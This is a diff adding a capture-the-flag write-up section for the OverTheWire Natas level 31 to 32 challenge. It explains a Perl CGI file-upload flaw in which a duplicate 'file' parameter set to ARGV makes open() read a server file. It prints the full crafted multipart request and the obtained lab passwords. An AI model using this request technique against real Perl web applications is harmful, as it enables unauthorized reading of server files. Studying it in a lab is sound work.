@@ -494,3 +494,75 @@ And that's it.
 hay7aecuungiuKaezuathuk9biin0pu1
 
 ## Level 31 -> 32
+
+This time we get the ability to upload a csv file, ostensibly to have it formatted into an html table. And no more cutesy blocking right clicking, so I can just open the link to the source. 
+It's another perl script. And I'm just guessing this might be a csv injection scenario.
+
+The script takes the uploaded file, splits the lines on commas, and prints out the columns and rows.
+
+Now, I looked up csv injection attacks, and what I could find seems to pertain to spreadsheet programs executing formulas or scripts embedded in cells. It seems doubtful that this applies in our case here. So I moved on to looking at how CGI upload works, and found a blog post tutorial that mentions validating the file name is safe to prevent the user from uploading a file to other parts of the server. Which is interesting. Because it looks like there is no validation on the file name in this script.
+
+However, I don't want to upload something to somewhere else. I want to get the contents of a file that already exists. What else can I do here.
+
+So reading online about open(), I find that it will open the file *unless* it ends in a `|`, in which case the filename is interpreted as a command and executed. That might be helpful.
+
+Digging around more, I found this pdf presentation on [blackhat.com](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf), that gave some very interesting information.
+
+Apparently, as I found out in the previous challenge, I can take advantage of providing two query parameters with the same name. This time, I will provide two 'file's. 
+
+For file uploads, the Content-Type is multipart/form-data. When I hit the submit button on the page, my request has the following payload in the body:
+```
+------WebKitFormBoundaryNVAqSsCF
+Content-Disposition: form-data; name="file"; filename="hi.txt"
+Content-Type: text/html
+
+hihihi
+------WebKitFormBoundaryNVAqSsCF
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryNVAqSsCF--
+
+```
+
+Now according to this presentation, the line `if ($cgi->upload('file'))` will check if ANY of the file parameters have been uploaded. Meaning I can provide two, and only one has to be uploadable in order for this check to succeed.
+Next, the statement `$cgi->param('file')` will return all of the matching parameter values, but only the first one will actually get stored to a variable on the left side of an assignment statement.
+Another good tidbit of information -- if this first 'file' value is a scalar, a plain string will be stored, and not a file handle. Why is this important? 
+The while loop which iterates through the file contents, `while (<$file>)` does something special if the string value of $file is ARGV. It will loop through the query parameters and pass them too an open() call. If $file was any other plain string, nothing useful would happen.
+
+Putting this all together, I formed the following request:
+```
+POST /index.pl?%2Fetc%2Fnatas_webpass%2Fnatas32 HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNVAqSsCF
+Origin: http://natas31.natas.labs.overthewire.org
+DNT: 1
+Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==
+Connection: close
+Referer: http://natas31.natas.labs.overthewire.org/index.pl
+Upgrade-Insecure-Requests: 1
+Content-Length: 347
+
+------WebKitFormBoundaryNVAqSsCF
+Content-Disposition: form-data; name="file"
+
+ARGV
+------WebKitFormBoundaryNVAqSsCF
+Content-Disposition: form-data; name="file"; filename="hi.txt"
+Content-Type: text/html
+
+hihihi
+------WebKitFormBoundaryNVAqSsCF
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryNVAqSsCF--
+
+``` 
+
+And password.
+no1vohsheCaiv3ieH4em1ahchisainge
